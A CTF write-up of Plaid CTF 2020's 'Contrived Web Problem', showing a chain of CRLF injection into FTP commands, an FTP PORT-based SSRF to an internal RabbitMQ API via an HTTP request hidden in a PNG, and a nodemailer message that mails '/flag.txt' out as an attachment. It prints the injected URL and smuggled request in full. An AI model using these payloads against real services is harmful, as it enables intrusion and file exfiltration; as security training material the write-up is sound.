    <content type="html"><![CDATA[<html><head></head><body><p>Here is my write up of Contrived Web Problem in Plaid CTF 2020.</p><a id="more"></a><p>[TOC]</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>You can get the attachment of the chall in this <a href="https://github.com/ZeddYu/Plaid-CTF-2020-Web" target="_blank" rel="noopener">repo</a>.</p><ol><li>You can find CRLF in ftp then use CRLF to inject ftp command.</li><li>You can use PORT command to build a TCP connection with rabbitmq server.</li><li>Make a HTTP message which can let the nodemailer send a email containing the flag as a attachment to your email through rabbitmq web api.</li><li>Hide this HTTP message in a PNG. Upload the picture as your profile.</li><li>Use the REST command to cut the PNG and let PETR command return the HTTP message which is in the PNG to rabbitmq server.</li><li>Check FLAG in your email.</li></ol><h2 id="CRLF-in-FTP"><a href="#CRLF-in-FTP" class="headerlink" title="CRLF in FTP"></a>CRLF in FTP</h2><p>We guess there should be a CRLF in FTP at first. And use <code>%250d%250a</code> to test it because it use the following code.</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (parsed.protocol === <span class="hljs-string">"ftp:"</span>) {</span><br><span class="line">  <span class="hljs-keyword">let</span> username = <span class="hljs-built_in">decodeURIComponent</span>(parsed.username);</span><br><span class="line">  <span class="hljs-keyword">let</span> password = <span class="hljs-built_in">decodeURIComponent</span>(parsed.password);</span><br><span class="line">  <span class="hljs-keyword">let</span> filename = <span class="hljs-built_in">decodeURIComponent</span>(parsed.pathname);</span><br><span class="line">  <span class="hljs-keyword">let</span> ftpClient = <span class="hljs-keyword">await</span> connectFtp({</span><br><span class="line">    host: parsed.hostname,</span><br><span class="line">    port: parsed.port !== <span class="hljs-string">""</span> ? <span class="hljs-built_in">parseInt</span>(parsed.port) : <span class="hljs-literal">undefined</span>,</span><br><span class="line">    user: username !== <span class="hljs-string">""</span> ? username : <span class="hljs-literal">undefined</span>,</span><br><span class="line">    password: password !== <span class="hljs-string">""</span> ? password : <span class="hljs-literal">undefined</span>,</span><br><span class="line">  });</span><br><span class="line">  image = <span class="hljs-keyword">await</span> ftpClient.get(filename);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>Send this url through <code>api/image</code>.</p><p></p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/image?url=ftp://<span class="hljs-number">2</span>:<span class="hljs-number">2</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aPORT<span class="hljs-symbol">%20172</span>,<span class="hljs-number">32</span>,<span class="hljs-number">56</span>,<span class="hljs-number">72</span>,<span class="hljs-number">61</span>,<span class="hljs-number">56</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aREST<span class="hljs-symbol">%206</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aRETR<span class="hljs-symbol">%20</span><span class="hljs-symbol">%252</span>fuser<span class="hljs-symbol">%252</span>fb<span class="hljs-number">21791e2</span><span class="hljs-number">-6016</span><span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-number">-8</span>f<span class="hljs-number">9</span>a<span class="hljs-number">-6054750</span>d<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a<span class="hljs-symbol">%252</span>fprofile<span class="hljs-symbol">%252</span>epng<span class="hljs-title">@ftp</span>:<span class="hljs-number">21</span>/user/b<span class="hljs-number">21791e2</span><span class="hljs-number">-6016</span><span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-number">-8</span>f<span class="hljs-number">9</span>a<span class="hljs-number">-6054750</span>d<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a/profile.png</span><br></pre></td></tr></tbody></table></figure><p></p><p>This url will make a request like this.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/1.png" alt=""></p><p>So we get a CRLF now.</p><p>Or you can audit the code of ftp <a href="https://github.com/mscdex/node-ftp" target="_blank" rel="noopener">https://github.com/mscdex/node-ftp</a> then you can find it do nothing with CRLF.</p><h2 id="The-active-mode-of-FTP"><a href="#The-active-mode-of-FTP" class="headerlink" title="The active mode of FTP"></a>The active mode of FTP</h2><p>FTP have two modes, one is active and the other is passive.</p><blockquote><p>In <em>active</em> mode, the client establishes the command channel but the <em>server</em> is responsible for establishing the data channel. This can actually be a problem if, for example, the client machine is protected by firewalls and will not allow unauthorised session requests from external parties.</p><p>In <em>passive</em> mode, the client establishes <em>both</em> channels. We already know it establishes the command channel in active mode and it does the same here.</p></blockquote><p>If we don’t inject code through CRLF, we can get the FTP traffic like this:</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/2.png" alt=""></p><p>So it will use <code>PASV</code> command to open passive mode and build a connection with client.</p><p>Why not inject <code>PORT</code> commant through CRLF to let ftp-srv open active mode and let ftp-srv connect with my server?</p><p>Yeah. Just like this. I use <code>PORT</code> command to let ftp-srv connect with my server.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/1.png" alt=""></p><p>But if you try with <code>LIST</code> or something else following by <code>PORT</code> command, you can’t get the response on your server. It’s a bit strange that I still confused about it. If you know something about this, welcome to discuss.</p><h2 id="The-mail-server"><a href="#The-mail-server" class="headerlink" title="The mail server"></a>The mail server</h2><p>And how can we get flag? Use FTP? But the flag.txt is not on the ftp server. So we should think about how to get flag.</p><p>I notice there is a function that use to reset user’s password.</p><p>services/api/index.ts</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="hljs-string">"/password-reset"</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {</span><br><span class="line">  <span class="hljs-keyword">let</span> { email } = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> email !== <span class="hljs-string">"string"</span>) {</span><br><span class="line">    res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">"Bad body"</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> newPassword = <span class="hljs-built_in">Array</span>.from(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">16</span>), <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-string">"abcdefghijklmnopqrstuvwxyz0123456789"</span>[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">36</span>)]).join(<span class="hljs-string">""</span>);</span><br><span class="line">  <span class="hljs-keyword">let</span> hashedPassword = <span class="hljs-keyword">await</span> bcrypt.hash(newPassword, <span class="hljs-number">14</span>);</span><br><span class="line">  <span class="hljs-keyword">await</span> withClient(<span class="hljs-function">(<span class="hljs-params">client</span>) =&gt;</span> client.query(<span class="hljs-string">`</span></span><br><span class="line"><span class="hljs-string">UPDATE user_auth</span></span><br><span class="line"><span class="hljs-string">SET password = $2</span></span><br><span class="line"><span class="hljs-string">WHERE email = $1</span></span><br><span class="line"><span class="hljs-string">`</span>, [email, hashedPassword]));</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> channel = <span class="hljs-keyword">await</span> rabbit.createChannel();</span><br><span class="line">  channel.sendToQueue(<span class="hljs-string">"email"</span>, Buffer.from(<span class="hljs-built_in">JSON</span>.stringify({</span><br><span class="line">    to: email,</span><br><span class="line">    subject: <span class="hljs-string">"Password Reset"</span>,</span><br><span class="line">    text: <span class="hljs-string">`Hello there, your new password is <span class="hljs-subst">${newPassword}</span>`</span>,</span><br><span class="line">  })));</span><br><span class="line"></span><br><span class="line">  res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">"Password reset"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>It seems we can’t control the <code>${newPassword}</code>. But I find a way to get flag through reading nodemailer’s documentation.</p><p><a href="https://nodemailer.com/message/attachments/" target="_blank" rel="noopener">https://nodemailer.com/message/attachments/</a></p><p>We can send an email containing the flag as attachment! We can make a json like this:</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"to"</span>:<span class="hljs-string">"your@gmail.com"</span>,<span class="hljs-attr">"subject"</span>:<span class="hljs-string">"Password Reset"</span>,<span class="hljs-attr">"text"</span>:<span class="hljs-string">"Hello there, your new password is newpass"</span>,<span class="hljs-attr">"attachments"</span>:[{<span class="hljs-attr">"filename"</span>:<span class="hljs-string">"flag.txt"</span>,<span class="hljs-attr">"path"</span>:<span class="hljs-string">"/flag.txt"</span>}]}</span><br></pre></td></tr></tbody></table></figure><p></p><p>So what we need to do is to control nodemailer to send our message.</p><h2 id="rabbitmq"><a href="#rabbitmq" class="headerlink" title="rabbitmq"></a>rabbitmq</h2><p>services/email/index.ts</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> channel = <span class="hljs-keyword">await</span> rabbit.createChannel();</span><br><span class="line">channel.consume(<span class="hljs-string">"email"</span>, <span class="hljs-keyword">async</span> (msg) =&gt; {</span><br><span class="line">  <span class="hljs-keyword">if</span> (msg === <span class="hljs-literal">null</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  channel.ack(msg);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">try</span> {</span><br><span class="line">    <span class="hljs-keyword">let</span> data = <span class="hljs-built_in">JSON</span>.parse(msg.content.toString());</span><br><span class="line">    <span class="hljs-keyword">await</span> transport.sendMail({</span><br><span class="line">      <span class="hljs-keyword">from</span>: <span class="hljs-string">"plaid2020problem@gmail.com"</span>,</span><br><span class="line">      subject: <span class="hljs-string">"Your Account"</span>,</span><br><span class="line">      ...data,</span><br><span class="line">    });</span><br><span class="line">  } <span class="hljs-keyword">catch</span> (e) {</span><br><span class="line">    <span class="hljs-built_in">console</span>.error(e);</span><br><span class="line">  }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p></p><p>And we can find how server sendemail here. It uses rabbitmq. And rabbitmq has got web api. </p><p>So it seems we can control what nodemailer send through rabbitmq’s web api.</p><p>But how can we send http request to rabbitmq? It seems we have got the method how to get flag and the method let ftp server build TCP connection with arbitrary server.</p><p>It seems we need a connection with them!</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF!"></a>SSRF!</h2><p>The last key to solve this problem is let the ftp server send a http request to rabbitmq server.</p><p>But how?</p><p>We notice that we can hide a http message in the profile png and use <code>RRETR</code> to let the ftp server return the message of png.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/3.png" alt=""></p><p>And use <code>REST 6</code> to cut the message, make the response like a http message. This is similar with http response splitting.</p><p>So when ftp server return the data of profile picture, it will return data like this:</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/exchanges/%2f/amq%2edefault/publish</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: 172.32.56.72:15672</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">authorization</span>: Basic dGVzdDp0ZXN0</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 300</span><br><span class="line"></span><br><span class="line">{"properties":{},"routing_key":"email","payload":"your_payload","payload_encoding":"base64"}</span><br></pre></td></tr></tbody></table></figure><p></p><p>But the TCP connection is not persisted, we can’t get the response of rabbitmq server and most importantly we can’t add a new message in rabbitmq queue. </p><p>During the competition, we have to frequently send lots of requests to api server. Hope some requests can exploit successfully. At last we made it once.</p><p>After ctf ends, @zwad3, the author of this chall, replied to me.</p><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/zwad3/status/1252087190278082562" target="_blank" 